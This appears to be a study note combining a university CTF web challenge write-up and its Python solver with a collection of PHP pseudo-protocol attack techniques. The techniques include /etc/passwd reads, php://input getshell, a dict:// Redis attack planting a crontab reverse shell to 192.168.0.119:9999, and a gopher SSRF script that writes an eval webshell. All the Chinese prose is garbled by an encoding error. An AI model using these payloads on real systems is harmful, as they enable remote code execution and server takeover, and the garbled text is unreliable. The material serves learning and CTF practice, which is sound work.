## è¥¿å—äº¤é€šå¤§å­¦ ç¬¬å…­å±Š CTF æ–°ç§€æ¯

### Web

#### ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

æè¿°:

```

æ¯å¹´æ¯”èµ›ï¼Œç»„å§”ä¼šçš„ä¸€é¡¹é‡è¦å·¥ä½œå°±æ˜¯æ—¶åˆ»ç›¯ç€ç¾¤ï¼Œå¹¶ä¸”æ’¤å›å…¶ä¸­æœ‰ flag å’Œé™¤äº†ç­¾åˆ°é¢˜çš„é¢˜è§£çš„æ¶ˆæ¯ã€‚ä»Šå¹´çš„ç½‘å®‰ä¹Ÿæ˜¯å¥½èµ·æ¥çš„ï¼Œå¾ˆå¤šäººå¼€å§‹æ°´èµ·ç¾¤æ¥äº†ï¼Œè¿™å¯¼è‡´ä»Šå¹´äººæ‰‹ç´§å¼ èµ·æ¥äº†ï¼

å› ä¸ºäººæ‰‹ç´§å¼ ï¼Œç»„å§”ä¼šçš„æŸååŒå­¦å°†è¿™é¡¹å·¥ä½œå¤–åŒ…ç»™äº†ä½ ï¼Œä½ éœ€è¦è¿ç»­å®¡æŸ¥ 1000 æ¡æ¶ˆæ¯ï¼Œå‡†ç¡®æ— è¯¯åœ°æ’¤å›å…¶ä¸­æ‰€æœ‰å« flag çš„æ¶ˆæ¯ï¼Œå¹¶ä¸”ä¸æ’¤å›ä»»ä½•ä¸å« flag çš„æ¶ˆæ¯ã€‚

æœ¬é¢˜ä¸­ï¼Œä½ éœ€è¦æ’¤å›çš„ "flag" çš„æ ¼å¼ä¸º fake[...]ï¼Œå…¶ä¸­æ–¹æ‹¬å·å†…å‡ä¸ºå°å†™è‹±æ–‡å­—æ¯ï¼Œç‚¹å‡»æ¶ˆæ¯å³å¯æ’¤å›ã€‚ä½ éœ€è¦åœ¨ 5 ç§’å†…æ’¤å›æ¶ˆæ¯ï¼Œå¦åˆ™æ’¤å›æ“ä½œå°†å¤±è´¥ã€‚åœ¨å…¨éƒ¨æ¶ˆæ¯æ˜¾ç¤ºå®Œæˆåç­‰å¾…å‡ ç§’ï¼Œå¦‚æœä½ æ’¤å›çš„æ¶ˆæ¯å®Œå…¨æ­£ç¡®ï¼ˆæ’¤å›äº†å…¨éƒ¨éœ€è¦æ’¤å›çš„æ¶ˆæ¯ï¼Œå¹¶ä¸”æœªå°†ä¸éœ€è¦æ’¤å›çš„æ¶ˆæ¯æ’¤å›ï¼‰ï¼Œå°±èƒ½è·å¾—æœ¬é¢˜çœŸæ­£çš„ flagã€‚
```

æ‰“å¼€é¢˜åç‚¹äº†ä¸¤ä¸‹ï¼ŒF12å‘ç°postè¯·æ±‚äº†ï¼š

```
/api/getMessages
/api/deleteMessage
/api/getflag
```

å®ƒä»¬åšäº†å¦‚ä¸‹æ“ä½œï¼š

`/api/getMessages`å‘æœåŠ¡å™¨è·å–æ¶ˆæ¯åˆ—è¡¨ã€‚

å½“ç»„å§”ä¼šæ’¤å›æ¶ˆæ¯ä¼šPOST `/api/deleteMessages`ï¼Œå‘é€IDå·ã€‚

å½“å…¨éƒ¨æ’¤å›å®Œåä¸€æ®µæ—¶é—´ï¼ŒPOST `/api/getflag`ï¼Œè·å–flagã€‚

messageæ ¼å¼ï¼š

```
{'messages': [{'delay': 0.13627789725761869, 'text': 'è¿™é“é¢˜ flag æ˜¯fake[cffuwys]'}, {'delay': 0.5362774573774165, 'text': 'ä»Šå¤©æ˜¯ç–¯ç‹‚æ˜ŸæœŸå››ï¼ï¼'}, {'delay': 1.4077754633486774, 'text': 'è¿™é“é¢˜ flag æ˜¯fake[utkexlfu]'}, {'delay': 1.7701952384083033, 'text': 'hucgedoewhn'}, {'delay': 2.2584770199536695, 'text': 'è¿™é“é¢˜ flag æ˜¯fake[flzozgmdhj]'}, {'delay': 2.9936154892744136, 'text': 'ğŸ˜…'}, {'delay': 3.1045501288387003, 'text': '0d000721'}, {'delay': 3.9103066223191507, 'text': 'è¿™é“é¢˜ flag æ˜¯fake[lkufuenpapngzi]'}, {'delay': 4.290338739604455, 'text': 'æˆ‘åœ¨å›¾ä¹¦é¦†å‘¢ï¼Œç­¾åˆ°é¢˜å“æˆ‘ä¸€è·³'}}
```

POC:

```python
import requests
import json
import time
getMessages_url = "http://8.137.85.79:20986/api/getMessages"
re = requests.post(getMessages_url)
data = json.loads(re.text)
print(data)
# æŸ¥æ‰¾åŒ…å« 'fake' å­—æ®µçš„å…ƒç´ å¹¶è¾“å‡ºå…¶åºå·
fake_indices = [index for index, message in enumerate(data['messages']) if 'fake[' in message['text']]
# è¾“å‡ºç»“æœ
print(fake_indices)
t = time.time()
#å‘é€delete
for index in fake_indices:
    #é˜²æ­¢å‘ç”Ÿæ—¶å…‰ç©¿æ¢­
    times = data['messages'][index]['delay'] + t
    print(data['messages'][index]['delay'])
    print(time.time())
    while times > time.time():
        print("times="+str(times))
        print("time ="+str(time.time()))
        time.sleep(0.5)

    deleteMessag_url = "http://8.137.85.79:20986/api/deleteMessage"
    deleteMessag_data = {
        "id": index
    }
    re = requests.post(deleteMessag_url, json=deleteMessag_data)
    # print(data)
    print(re.text)

getflag_url = "http://8.137.85.79:20986/api/getflag"
re = requests.post(getflag_url)
print(re.text)
```

æ€è·¯ï¼šå…ˆgetmessagesï¼Œç„¶ååˆ†æå“ªå‡ æ¡æ¶ˆæ¯é‡Œæœ‰ `fake[`ç‰¹å¾ï¼Œè®°å½•ä¸‹ä»–ä»¬çš„IDï¼Œå‘é€ç»™deletemessagesï¼Œå…¨éƒ¨æ’¤å›å®Œååœ¨getflagã€‚

è¿™é‡Œåœ¨å®è·µè¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ã€‚

å°±æ˜¯æ¶ˆæ¯åœ¨getmessagesåä¼šdelayä¸€æ®µæ—¶é—´æ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœåœ¨æ˜¾ç¤ºå‡ºæ¥ä¹‹å‰å°±deleteä¼šè§¦å‘é”™è¯¯ï¼š

`{"error":"æ£€æµ‹åˆ°æ—¶ç©ºç©¿è¶Š","success":false}`

æ‰€ä»¥åœ¨pythonè„šæœ¬ä¸­ä¹Ÿè¦delayä¸€æ®µæ—¶é—´å†å‘é€deleteã€‚

è§£å†³åŠæ³•ï¼š

å…ˆè®°å½•ä¸‹getmessagesçš„æ—¶é—´å¤åˆ¶ç»™tï¼Œwebå‰ç«¯åŠ è½½å‡ºæ¥çš„æ—¶é—´å³ `t+delay`ã€‚

äºæ˜¯åªè¦ä¿è¯å½“å‰æ—¶é—´å°äº `t+delay`å†å‘é€deleteã€‚è¿™é‡Œç”¨whileå®ç°ã€‚

getflagï¼š

![1733368847945](image/1131-1206å‘¨æŠ¥/1733368847945.png)

# çŸ¥è¯†æ”¶é›†

## PHPä¼ªåè®®

https://blog.csdn.net/weixin_51735061/article/details/123156046

### file://åè®®

ç”¨æ¥è¯»å–æœ¬åœ°çš„æ–‡ä»¶ï¼Œå½“ç”¨äºæ–‡ä»¶è¯»å–å‡½æ•°æ—¶å¯ä»¥ç”¨ã€‚

å¸¸è§æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´å†™æ³•ï¼š

www.xxx.com/?file=file:///etc/passwd

æ­¤åè®®ä¸å—allow_url_fopen,allow_url_includeé…ç½®å½±å“


### php://inputåè®®

æ­¤åè®®ä¸€èˆ¬ç”¨äºè¾“å…¥getshellçš„ä»£ç ã€‚

ä½¿ç”¨æ–¹æ³•ï¼š
åœ¨getå¤„å¡«ä¸Šphp://inputå¦‚ä¸‹

www.xxx.xxx/?cmd=php://input

ç„¶åç”¨hackbaræˆ–è€…å…¶ä»–å·¥å…·ï¼ŒpostPHPä»£ç è¿›è¡Œæ£€éªŒï¼Œå¦‚

<?php>phpinfo()?>

æ­¤åè®®å—allow_url_includeé…ç½®å½±å“


### php://filteråè®®

æ­¤åè®®ä¸€èˆ¬ç”¨æ¥æŸ¥çœ‹æºç 

ä¸€èˆ¬ç”¨æ³•å¦‚ä¸‹

www.xxx.xxx/?file=php://filter/read=covert,vase64-encode/resource=index.php

å‡ºæ¥çš„æ˜¯base64ç éœ€è¦è¿›è¡Œè§£ç 

æ­¤åè®®ä¸å—allow_url_fopen,allow_url_includeé…ç½®å½±å“


### data://åè®®

éœ€è¦allow_url_fopen,allow_url_includeå‡ä¸ºon

è¿™æ˜¯ä¸€ä¸ªè¾“å…¥æµæ‰§è¡Œçš„åè®®ï¼Œå®ƒå¯ä»¥å‘æœåŠ¡å™¨è¾“å…¥æ•°æ®ï¼Œè€ŒæœåŠ¡å™¨ä¹Ÿä¼šæ‰§è¡Œã€‚å¸¸ç”¨ä»£ç å¦‚ä¸‹ï¼š

http://127.0.0.1/include.php?file=data://text/plain,`<?php%20phpinfo();?>`

text/plainï¼Œè¡¨ç¤ºçš„æ˜¯æ–‡æœ¬

text/plain;base64, è‹¥çº¯æ–‡æœ¬æ²¡ç”¨å¯ç”¨base64ç¼–ç 


### dict://åè®®

ä¸gopheråè®®ä¸€èˆ¬éƒ½å‡ºç°åœ¨ssrfåè®®ä¸­ï¼Œç”¨æ¥æ¢æµ‹ç«¯å£çš„æŒ‡çº¹ä¿¡æ¯ã€‚åŒæ—¶ä¹Ÿå¯ä»¥ç”¨å®ƒæ¥ä»£æ›¿gopheråè®®è¿›è¡Œssrfæ”»å‡»ã€‚

å¸¸è§ç”¨æ³•ï¼š

æ¢æµ‹ç«¯å£æŒ‡çº¹
192.168.0.0/?url=dict://192.168.0.0:6379

ä»¥ä¸Šä¸ºæ¢æµ‹6379ï¼ˆredisï¼‰ç«¯å£çš„å¼€å‘

åå¼¹shell
1ã€å¼€å¯åå¼¹shellçš„ç›‘å¬

nc -l 9999

2ã€ä¾æ¬¡æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤

curl dict://192.168.0.119:6379/set:mars:"\n\n * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n\n"
curl dict://192.168.0.119:6379/config:set:dir:/etc/
curl dict://192.168.0.119:6379/config:set:dbfilename:crontab
curl dict://192.168.0.119:6379/bgsave*

æ‰§è¡Œæ—¶ï¼Œåå¼¹shellçš„å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯set:mars:xxxï¼Œä¼šå› ä¸ºç‰¹æ®Šå­—ç¬¦çš„åŸå› æ— æ³•å†™å…¥åˆ°ç›®æ ‡çš„redisä¸­ï¼Œè¢«è¢«ç©ºæ ¼æ‰€åˆ†å‰²å¯¼è‡´å‡ºç°ä¸€ä¸‹æƒ…å†µï¼š

1584705879.520734 [0 172.17.0.1:44488] â€œsetâ€ â€œmarsâ€ â€œ\n\n*â€ â€œ" "â€ â€œ" "â€ â€œrootâ€ â€œbashâ€ â€œ-iâ€ â€œ>&â€ â€œ/dev/tcp/192.168.0.119/6789â€ "0>&1\n\n"

æˆ‘ä»¬ä¼šå‘ç°ï¼Œå‘½ä»¤è¢«åˆ†å‰²äº†ï¼Œçœ‹è¡¨è±¡æ„Ÿè§‰åƒæ˜¯è¢«ç©ºæ ¼åˆ†å‰²äº†ã€‚æ­¤æ—¶å°†åå¼¹shellçš„å‘½ä»¤è¿›è¡Œåå…­è¿›åˆ¶è½¬æ¢ï¼Œå˜ä¸ºï¼š

curl dict://192.168.0.119:6379/set:mars:"\x0a\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x72\x6f\x6f\x74\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x30\x2e\x31\x31\x39\x2f\x39\x39\x39\x39\x20\x30\x3e\x26\x31\x0a"

ä»¥ä¸Šå•å¼•å·ä½¿ç”¨åæ–œæ \è¿›è¡Œè½¬ç§»ï¼Œå…¶ä»–æ•°æ®è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°æ²¡æœ‰é”™è¯¯äº†

1584706087.980465 [0 172.17.0.1:44490] â€œsetâ€ â€œmarsâ€ "\n * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n"*

å‰©ä¸‹çš„ä¿®æ”¹è·¯å¾„å’Œæ–‡ä»¶åç§°çš„è¯·æ±‚ï¼Œæ­£å¸¸æ‰§è¡Œå³å¯


### gopher://åè®®

gopher://åè®®ç»å¸¸ç”¨æ¥æ‰“å†…ç½‘çš„å„ç§åº”ç”¨å¦‚mysql redisç­‰ã€‚ä¸€èˆ¬è¦ç”¨ä¸€äº›å·¥å…·æ¥è¿›è¡Œæ„é€ payload å¦‚gopherusç­‰

ä¹‹å‰ç”¨æ¥æ‰“rediså†…ç½‘çš„è„šæœ¬å¦‚ä¸‹

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib.request
from urllib.parse import quote

url = "http://192.168.239.78:41403/index.php?url="    #windowsä¸Šæ­å»ºçš„ssrfæ¼æ´é¡µé¢
gopher = "gopher://0.0.0.0:6379/_" #/var/www/html
#auth nonono
# æ”»å‡»è„šæœ¬
data = """
flushall
set test "\\n\\n<?php @eval($_POST[x]);?>\\n\\n"
config set dir /var/www/html
config set dbfilename shell.php
save
quit
"""
def encoder_url(data):
    encoder = ""
    for single_char in data:
        # å…ˆè½¬ä¸ºASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

# äºŒæ¬¡ç¼–ç 
encoder = encoder_url(encoder_url(data))

print(encoder)
# ç”Ÿæˆpayload
payload = url + quote(gopher,'utf-8') + encoder

# å‘èµ·è¯·æ±‚
request = urllib.request.Request(payload)
response = urllib.request.urlopen(request).read()
print(response)
```





### zip://åè®®

zip://åè®®å¯ä»¥ç”¨æ¥è®¿é—®æœåŠ¡å™¨ä¸­çš„å‹ç¼©åŒ…ï¼Œæ— è®ºå‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹çš„éƒ½å¯ä»¥æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæœåŠ¡å™¨ç¦æ­¢æˆ‘ä»¬ä¸Šä¼ phpæ–‡ä»¶é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠphpæ–‡ä»¶æ”¹åç¼€ç„¶åå‹ç¼©å†ä¸Šä¼ ï¼Œç„¶åç”¨zipåè®®è®¿é—®ã€‚è¦åˆ©ç”¨zipåè®®æ—¶ä¸€èˆ¬è¦ç»“åˆæ–‡ä»¶ä¸Šä¼ ä¸æ–‡ä»¶åŒ…å«ä¸¤ä¸ªæ¼æ´

ä¸€èˆ¬çš„ä»£ç ä¸º

www.xxx.xxx/?file=zip:///php.zip#phpinfo.jpg

å…¶ä¸­çš„#å¥½è¡¨ç¤ºçš„æ˜¯php.zipçš„å­æ–‡ä»¶åã€‚æœ‰æ—¶å€™#éœ€è¦å˜æˆ==%23==ï¼Œurlç¼–ç ã€‚

compress.bzip2://åè®®
ä¸zipåè®®ç±»ä¼¼ä¸è¿‡è¦å‹ç¼©æˆbzip2æ ¼å¼çš„

compress.zlib://åè®®
ä¸zipåè®®ç±»ä¼¼ä¸è¿‡è¦å‹ç¼©æˆzlibæ ¼å¼çš„

### phar://åè®®

phar://åè®®ä¸zip://åè®®ç±»ä¼¼ï¼Œå®ƒä¹Ÿå¯ä»¥è®¿é—®zipåŒ…ï¼Œè®¿é—®çš„æ ¼å¼ä¸zipçš„ä¸åŒï¼Œå¦‚ä¸‹æ‰€ç¤º

http://127.0.0.1/include.php?
file=phar:///phpinfo.zip/phpinfo.txt
#è¿™é‡Œç”¨/éš”å¼€äº†å­æ–‡ä»¶
